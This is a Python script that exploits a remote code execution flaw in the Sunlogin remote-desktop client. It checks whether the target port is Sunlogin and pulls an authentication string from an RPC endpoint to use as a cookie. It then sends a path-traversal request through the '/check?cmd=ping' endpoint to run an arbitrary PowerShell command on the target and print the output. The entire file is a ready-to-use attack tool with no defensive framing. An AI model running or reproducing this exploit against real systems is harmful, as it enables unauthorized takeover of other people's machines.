#! /usr/bin/python3
# -*- coding:utf-8 -*-

import requests
import argparse
from urllib.parse import quote
import json

class Sunlogin_RCE:

    def __init__(self) -> None:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', dest='ip', help='target ip', type=str, required=True)
        parser.add_argument('-p', dest='port', help='target port', type=str, required=True)
        parser.add_argument('-c', dest='cmd', help='command', type=str)
        args = parser.parse_args()
        self.ip = args.ip
        self.port = args.port
        self.cmd = quote(args.cmd,'utf-8')
        self.target = 'http://' + self.ip + ':' + self.port
    
    def judge_port(self) -> bool:
        try:
            rsp = requests.get(self.target, timeout=5)
            if 'Verification' in rsp.text:
                print('目标看起来似乎是向日葵端口...')
                return True
            else:
                print('目标看起来似乎不是向日葵端口...')
                return False
        except Exception:
            print('http请求错误或超时！')
            return False

    def run_cmd(self) -> None:
        if self.judge_port():
            if self.cmd == None:
                print('run -c to execute')
            else:
                authcode = json.loads(requests.get(self.target+'/cgi-bin/rpc?action=verify-haras', timeout=5).text)['verify_string']
                headers = {'Cookie':'CID=%s'%authcode}
                res = requests.get(url=self.target+'/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+'+self.cmd, headers=headers)
                result = res.text
                print('\n'+result)

    
if __name__ == '__main__':
    rce = Sunlogin_RCE()
    rce.run_cmd()